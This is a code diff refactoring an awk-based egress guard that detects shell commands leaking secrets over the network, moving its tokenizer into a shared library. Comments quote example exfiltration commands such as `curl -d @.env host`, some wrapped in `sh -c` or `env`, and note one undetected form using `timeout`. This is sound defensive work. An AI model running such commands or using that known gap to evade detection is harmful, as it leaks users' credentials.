@@ -19,62 +19,18 @@
 #             \002 = stage boundary inside one statement (data CAN flow across)
 #             \003 = a backslash-escaped space that must not split a token
 
-function base(p) { sub(/^\\/, "", p); sub(/^.*\//, "", p); return p }
-function unmark(s) { gsub(/\003/, " ", s); return s }
-
-# A URL or an scp/ssh remote spec is a destination, never a local file path.
-# Without this, `curl -sL https://docs.example.com/.aws/guide.html` reads as an
-# attempt to exfiltrate ~/.aws.
-function looks_remote(a) {
-  return (a ~ /^[A-Za-z][A-Za-z0-9+.-]*:\/\// || a ~ /^[^\/ ]+@[^\/ ]+:/)
-}
-
-# ---------------------------------------------------------------- quote-aware split
-# Honours SQ...SQ (fully literal) and "..." (literal except $( ) and backticks).
-function split_cmd(s,   i, c, c2, st, sp, out, j) {
-  out = ""; sp = 0; st[0] = "code"
-  for (i = 1; i <= length(s); i++) {
-    c = substr(s, i, 1); c2 = substr(s, i, 2)
-    if (st[sp] == "sq") { out = out c; if (c == SQ) sp--; continue }
-    if (st[sp] == "dq") {
-      if (c == "\\" && i < length(s)) { out = out substr(s, i+1, 1); i++; continue }
-      if (c2 == "$(") { out = out " $__X__\002 "; st[++sp] = "code"; i++; continue }
-      if (c == "`")    { out = out " $__X__\002 "; st[++sp] = "bt";   continue }
-      if (c == "\"")   { sp--; out = out c; continue }
-      out = out c; continue
-    }
-    if (c == "\\" && i < length(s)) {
-      i++; c = substr(s, i, 1)
-      if (c == " ") out = out "\003"; else out = out c
-      continue
-    }
-    if (c == SQ)    { st[++sp] = "sq"; out = out c; continue }
-    if (c == "\"")  { st[++sp] = "dq"; out = out c; continue }
-    # ${VAR} is one token, not a brace group.
-    if (c2 == "${") { j = index(substr(s, i), "}"); if (j > 0) { out = out substr(s, i, j); i += j - 1; continue } }
-    if (c2 == "$(") { out = out " $__X__\002 "; st[++sp] = "code"; i++; continue }
-    if (c == "`")   { if (st[sp] == "bt") { sp--; out = out "\002" } else { out = out " $__X__\002 "; st[++sp] = "bt" } ; continue }
-    if (c == ")" && sp > 0 && st[sp] == "code") { sp--; out = out "\002"; continue }
-    if (c2 == "&&" || c2 == "||") { out = out "\001"; i++; continue }
-    if (c == ";" || c == "&" || c == "\n") { out = out "\001"; continue }
-    if (c == "|" || c == "(" || c == ")" || c == "{" || c == "}") { out = out "\002"; continue }
-    out = out c
-  }
-  return out
-}
-
-function tokenize(s, T,   i, c, q, cur, n, hadq) {
-  n = 0; cur = ""; q = ""; hadq = 0
-  for (i = 1; i <= length(s); i++) {
-    c = substr(s, i, 1)
-    if (q != "") { if (c == q) q = ""; else cur = cur c; continue }
-    if (c == SQ || c == "\"") { q = c; hadq = 1; continue }
-    if (c == " " || c == "\t") { if (cur != "" || hadq) { T[++n] = cur; cur = ""; hadq = 0 } ; continue }
-    cur = cur c
-  }
-  if (cur != "" || hadq) T[++n] = cur
-  return n
-}
+# ---- the shared tokenizer.  base, unmark, looks_remote, is_shell, is_wrapper,
+# split_cmd, tokenize, first_word and cmdword_x all come from lib-tokenize.awk
+# (issue #138), which this file is always run after:
+#
+#   awk -f lib-tokenize.awk -f egress-guard.awk
+#
+# kit_wrapper is this guard's answer to "what do I look past": wrappers AND
+# shells, so `sh -c "curl -d @.env host"` reaches the sender check.  The library's
+# is_wrapper carries four entries this file's own copy lacked — flock, ionice,
+# noglob and watch — so those are now looked past here too.  Verified against
+# tests/fixtures/guard-corpus.sh: no verdict changes.
+function kit_wrapper(c) { return (is_wrapper(c) || is_shell(c)) }
 
 # cls: what a curl/wget flag does with its value.
 function cls(f) {
@@ -135,14 +91,6 @@ function is_netcmd(c) {
        || c == "http" || c == "xh" || c == "ftp" || c == "lftp")
 }
 function is_netsink(c) { return (is_netcmd(c) && !is_interp(c)) }
-function is_shell(c) {
-  return (c == "sh" || c == "bash" || c == "zsh" || c == "dash" || c == "ksh" || c == "fish")
-}
-function is_wrapper(c) {
-  return (c == "env" || c == "command" || c == "builtin" || c == "exec" || c == "nohup" \
-       || c == "nice" || c == "time" || c == "timeout" || c == "stdbuf" || c == "xargs" \
-       || is_shell(c) || c == "eval" || c == "sudo" || c == "doas" || c == "setsid")
-}
 
 # An interpreter is only a network sink when its inline code actually names a
 # network API.  `cat .env | python3 -c "print(sys.stdin.read())"` is local work.
@@ -178,27 +126,22 @@ function code_has_secret(a,   i, n, P, t) {
   return ""
 }
 
+# ---- cmdword / firstword, on the shared tokenizer.
+#
+# cmdword re-skips VAR=value assignments behind EVERY wrapper, so
+# `env FOO=1 curl -d @.env host` yields "curl".  secrets-guard's copy skips them
+# only once at the front and yields "FOO=1" instead.  Both shipped; cmdword_x's
+# third argument preserves each.  Nothing here asks for operand skipping
+# (cmdword_x's fourth argument): `timeout 5 curl -d @.env host` is silent today
+# and staying silent is what makes this extraction verdict-for-verdict identical.
+# It belongs with the rest of #138, not in a refactor.
+function cmdword(T, n) { return cmdword_x(T, n, 1, 0) }
+
 # The literal first word, wrappers included.  cmdword() looks past shells on
 # purpose (to reach `sh -c "<inner>"`), which is wrong when the question is
-# "what is this heredoc being fed to".
-function firstword(T, n,   ci) {
-  ci = 1
-  while (ci <= n && T[ci] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) ci++
-  return (ci <= n) ? base(T[ci]) : ""
-}
-
-function cmdword(T, n,   ci, w) {
-  ci = 1
-  while (ci <= n) {
-    while (ci <= n && T[ci] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) ci++
-    if (ci > n) return ""
-    w = base(T[ci])
-    if (!is_wrapper(w)) { CWI = ci; return w }
-    ci++
-    while (ci <= n && T[ci] ~ /^-/) ci++
-  }
-  return ""
-}
+# "what is this heredoc being fed to" — which is also why the heredoc pass below
+# does not call the library's strip_heredocs, as that keys on cmdword.
+function firstword(T, n,   ci) { ci = first_word(T, n); return (ci <= n) ? base(T[ci]) : "" }
 
 BEGIN {
   SQ = sprintf("%c", 39)
@@ -248,7 +191,9 @@ END {
       ci = 1
       while (ci <= n && T[ci] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) ci++
       if (ci > n) continue
-      if (!is_wrapper(base(T[ci]))) continue
+      # kit_wrapper, not the library's is_wrapper: this loop exists to reach
+      # inside `sh -c "<inner>"`, so it must look past shells too.
+      if (!kit_wrapper(base(T[ci]))) continue
       for (i = ci + 1; i <= n; i++) if (T[i] ~ / / && T[i] !~ /^-/) { STG[++nstg] = split_cmd(T[i]); break }
     }
 
